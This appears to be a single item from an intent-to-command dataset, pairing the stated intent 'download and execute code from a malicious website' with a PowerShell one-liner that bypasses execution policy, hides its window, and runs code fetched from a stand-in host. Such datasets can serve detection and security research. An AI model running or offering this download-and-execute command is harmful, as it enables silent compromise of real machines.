# Natural language intent:
# Download and execute code from a malicious website with specified PowerShell options.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://malicious_site.com/)"
